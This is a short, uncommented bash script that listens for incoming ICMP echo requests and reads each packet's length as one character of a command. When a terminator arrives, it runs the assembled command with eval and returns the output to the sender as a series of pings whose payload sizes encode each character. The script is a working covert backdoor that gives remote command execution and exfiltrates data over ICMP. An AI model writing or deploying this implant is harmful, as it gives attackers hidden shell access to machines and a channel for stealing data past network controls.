#!/bin/bash

IFACE="any"
TERM="*"
SLEEP="0.5"

sudo tcpdump -l -n -Q in -i "$IFACE" icmp and 'icmp[icmptype] == icmp-echo' 2>/dev/null | while read -r line; do
    src=$(echo "$line" | grep -oP 'IP \K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    len=$(echo "$line" | grep -oP 'length \K[0-9]+')

    [ -z "$src" ] && continue
    [ -z "$len" ] && continue
    [ "$len" -lt 1 ] || [ "$len" -gt 255 ] && continue

    ch=$(printf "\\$(printf '%03o' "$len")")

    if [ "$ch" != "$TERM" ]; then
        m="$m$ch"
    else
        sleep "$SLEEP"

        out=$(eval "$m" 2>&1)

        for (( i=0; i<${#out}; i++ )); do
            c="${out:$i:1}"
            code=$(printf '%d' "'$c")
            payload=$((code - 8))
            [ "$payload" -lt 0 ] && payload=0
            ping -c 1 -n -q -s "$payload" -W 1 "$src" >/dev/null 2>&1 &
        done

        term_code=$(printf '%d' "'$TERM")
        ping -c 1 -n -q -s $((term_code - 8)) -W 1 "$src" >/dev/null 2>&1 &

        m=""
    fi
done
